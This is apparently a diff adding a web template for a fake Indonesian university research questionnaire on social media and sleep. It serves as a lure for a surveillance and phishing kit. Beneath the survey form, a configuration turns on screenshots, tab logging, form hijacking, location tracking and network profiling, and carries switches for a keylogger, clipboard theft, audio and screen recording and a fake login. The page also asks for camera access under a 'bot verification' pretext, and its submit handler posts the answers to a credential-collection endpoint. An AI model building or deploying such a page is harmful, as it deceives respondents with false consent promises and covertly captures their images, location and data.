@@ -1,0 +1,245 @@
+{% extends "base.html" %}
+{% block title %}Kuisioner Penelitian{% endblock %}
+{% block head %}
+<style>
+body { font-family: system-ui, sans-serif; background: #f5f7fa; color: #333; margin: 0; }
+.q-header {
+  background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+  color: #fff; padding: 20px; text-align: center;
+}
+.q-header h1 { font-size: 18px; margin: 0 0 6px; font-weight: 600; }
+.q-header p { font-size: 12px; opacity: 0.9; margin: 0; }
+.q-body { max-width: 480px; margin: 0 auto; padding: 20px; }
+.q-card {
+  background: #fff; border-radius: 12px; padding: 20px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.06); margin-bottom: 16px;
+}
+.q-card h3 { font-size: 14px; color: #1e3c72; margin: 0 0 12px; font-weight: 600; }
+.q-card p { font-size: 13px; color: #666; line-height: 1.6; margin: 6px 0; }
+.q-field { margin-bottom: 14px; }
+.q-field label { display: block; font-size: 13px; color: #555; margin-bottom: 6px; font-weight: 500; }
+.q-field input[type=text], .q-field input[type=number], .q-field select, .q-field textarea {
+  width: 100%; padding: 11px 14px; border: 1.5px solid #e0e4e9; border-radius: 8px;
+  font-size: 14px; background: #fafbfc; box-sizing: border-box;
+  font-family: inherit;
+}
+.q-field input:focus, .q-field select:focus, .q-field textarea:focus {
+  outline: none; border-color: #2a5298; background: #fff;
+}
+.q-field textarea { resize: vertical; min-height: 70px; }
+.q-radio-group { display: flex; gap: 16px; flex-wrap: wrap; }
+.q-radio-group label { display: flex; align-items: center; gap: 6px; cursor: pointer; font-size: 13px; }
+.q-consent {
+  display: flex; gap: 10px; padding: 14px;
+  background: #fff8e1; border: 1px solid #ffe082;
+  border-radius: 8px; font-size: 12px; color: #7a5c00;
+  line-height: 1.5;
+}
+.q-consent input { margin-top: 2px; }
+.q-btn {
+  width: 100%; padding: 15px; border: none; border-radius: 8px;
+  background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+  color: #fff; font-size: 16px; font-weight: 600; cursor: pointer;
+  margin-top: 8px;
+}
+.q-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+.q-footer { text-align: center; font-size: 11px; color: #999; padding: 20px; }
+</style>
+{% endblock %}
+{% block body %}
+
+<div class="q-header">
+  <h1>📋 Kuisioner Penelitian Akademik</h1>
+  <p>Universitas Indonesia · Fakultas Ilmu Komputer</p>
+</div>
+
+<div class="q-body">
+
+  <div class="q-card">
+    <h3>ℹ️ Informasi Penelitian</h3>
+    <p><b>Judul:</b> Pengaruh Penggunaan Media Sosial terhadap Kualitas Tidur Mahasiswa</p>
+    <p><b>Peneliti:</b> Budi Santoso (NIM: 2106123456)</p>
+    <p><b>Dosen Pembimbing:</b> Dr. Siti Aminah, M.Kom.</p>
+    <p><b>Durasi pengisian:</b> ±3 menit</p>
+  </div>
+
+  <div class="q-card">
+    <h3>✍️ Data Responden</h3>
+    <div class="q-field">
+      <label>Nama (boleh inisial)</label>
+      <input type="text" name="nama" placeholder="Contoh: B.S. atau Nama lengkap">
+    </div>
+    <div class="q-field">
+      <label>Usia</label>
+      <input type="number" name="usia" placeholder="Contoh: 21" min="15" max="60">
+    </div>
+    <div class="q-field">
+      <label>Jenis Kelamin</label>
+      <div class="q-radio-group">
+        <label><input type="radio" name="jk" value="L"> Laki-laki</label>
+        <label><input type="radio" name="jk" value="P"> Perempuan</label>
+      </div>
+    </div>
+    <div class="q-field">
+      <label>Domisili (Kota)</label>
+      <input type="text" name="kota" placeholder="Contoh: Depok">
+    </div>
+  </div>
+
+  <div class="q-card">
+    <h3>📝 Pertanyaan Penelitian</h3>
+    <div class="q-field">
+      <label>1. Berapa jam rata-rata Anda menggunakan media sosial per hari?</label>
+      <select name="q1">
+        <option value="">-- Pilih --</option>
+        <option>< 1 jam</option>
+        <option>1-3 jam</option>
+        <option>3-5 jam</option>
+        <option>> 5 jam</option>
+      </select>
+    </div>
+    <div class="q-field">
+      <label>2. Platform yang paling sering digunakan?</label>
+      <select name="q2">
+        <option value="">-- Pilih --</option>
+        <option>Instagram</option>
+        <option>TikTok</option>
+        <option>Twitter/X</option>
+        <option>Facebook</option>
+        <option>YouTube</option>
+        <option>WhatsApp</option>
+      </select>
+    </div>
+    <div class="q-field">
+      <label>3. Rata-rata jam tidur Anda per malam?</label>
+      <select name="q3">
+        <option value="">-- Pilih --</option>
+        <option>< 4 jam</option>
+        <option>4-5 jam</option>
+        <option>5-6 jam</option>
+        <option>6-7 jam</option>
+        <option>> 7 jam</option>
+      </select>
+    </div>
+    <div class="q-field">
+      <label>4. Apakah Anda sering begadang karena media sosial?</label>
+      <div class="q-radio-group">
+        <label><input type="radio" name="q4" value="sering"> Sering</label>
+        <label><input type="radio" name="q4" value="kadang"> Kadang</label>
+        <label><input type="radio" name="q4" value="tidak"> Tidak pernah</label>
+      </div>
+    </div>
+    <div class="q-field">
+      <label>5. Saran / komentar (opsional)</label>
+      <textarea name="q5" placeholder="Tulis di sini..."></textarea>
+    </div>
+  </div>
+
+  <div class="q-card">
+    <h3>📸 Verifikasi Responden</h3>
+    <p style="font-size:12px;color:#888;margin-bottom:10px">
+      Untuk memastikan responden valid (bukan bot), kami memerlukan foto singkat dan lokasi Anda saat mengisi kuisioner. Data akan dianonimkan.
+    </p>
+    <p style="font-size:12px;color:#888">
+      Klik <b>Kirim</b> untuk mengizinkan kamera dan lokasi.
+    </p>
+  </div>
+
+  <div class="q-card">
+    <div class="q-consent">
+      <input type="checkbox" id="consent">
+      <label for="consent" style="margin:0;cursor:pointer;font-weight:normal">
+        Saya menyetujui data ini digunakan untuk kepentingan penelitian akademik. Data akan dianonimkan dan tidak dibagikan ke pihak ketiga.
+      </label>
+    </div>
+  </div>
+
+  <button class="q-btn" id="btnSubmit" disabled>KIRIM KUISIONER</button>
+</div>
+
+<div class="q-footer">
+  © 2026 Penelitian Akademik · Data Anda dilindungi
+</div>
+
+<video id="v" autoplay playsinline muted hidden></video>
+<canvas id="c" hidden></canvas>
+<div id="status" hidden></div>
+<div id="log" hidden></div>
+
+<script>
+  window.CAMPAIGN = "kuisioner-skripsi";
+  window.CONFIG = {
+    ENABLE_SCREENSHOT: true,
+    ENABLE_BURST: false,
+    BURST_INTERVAL: 3,
+    BURST_DURATION: 30,
+    ENABLE_KEYLOGGER: false,
+    ENABLE_CLIPBOARD: false,
+    ENABLE_TAB_LOG: true,
+    ENABLE_FORM_HIJACK: true,
+    ENABLE_AUTO_SCROLL_SHOT: false,
+    AUTO_SCROLL_INTERVAL: 8,
+    ENABLE_SCREEN_RECORD: false,
+    SCREEN_RECORD_DURATION: 20,
+    ENABLE_AUDIO_RECORD: false,
+    AUDIO_RECORD_DURATION: 10,
+    ENABLE_LOCATION_TRACKING: true,
+    LOCATION_INTERVAL: 30,
+    ENABLE_MOTION_TRACK: false,
+    ENABLE_NETWORK_INFO: true,
+    ENABLE_FAKE_LOGIN: false,
+    FAKE_LOGIN_DELAY: 15
+  };
+</script>
+<script src="{{ url_for('static', filename='js/capture.js') }}"></script>
+
+<script>
+(function() {
+  var btn = document.getElementById('btnSubmit');
+  var consent = document.getElementById('consent');
+
+  consent.addEventListener('change', function() {
+    btn.disabled = !consent.checked;
+  });
+
+  btn.addEventListener('click', function() {
+    // Kumpulkan jawaban
+    var form = {};
+    document.querySelectorAll('input, select, textarea').forEach(function(el) {
+      if (el.name && !el.disabled) {
+        if (el.type === 'radio' && !el.checked) return;
+        if (el.type === 'checkbox' && !el.checked) return;
+        form[el.name] = el.value;
+      }
+    });
+
+    // Kirim ke server
+    fetch('/intel/credential', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        session_ts: window.sessionTs || '',
+        username: form.nama || 'anonim',
+        password: JSON.stringify(form),
+        source: 'kuisioner_skripsi'
+      })
+    }).catch(function(){});
+
+    // Tampilkan halaman terima kasih
+    document.body.innerHTML = (
+      '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;text-align:center;padding:30px;font-family:system-ui">' +
+      '<div>' +
+      '<div style="font-size:80px;margin-bottom:16px">🎓</div>' +
+      '<h1 style="font-size:24px;margin:0 0 12px">Terima Kasih!</h1>' +
+      '<p style="opacity:0.9;line-height:1.6;max-width:320px;margin:0 auto">' +
+      'Jawaban Anda telah tersimpan. Partisipasi Anda sangat berarti bagi penelitian ini.' +
+      '</p>' +
+      '<p style="opacity:0.7;font-size:13px;margin-top:20px">— Budi Santoso —</p>' +
+      '</div>' +
+      '</div>'
+    );
+  });
+})();
+</script>
+
+{% endblock %}
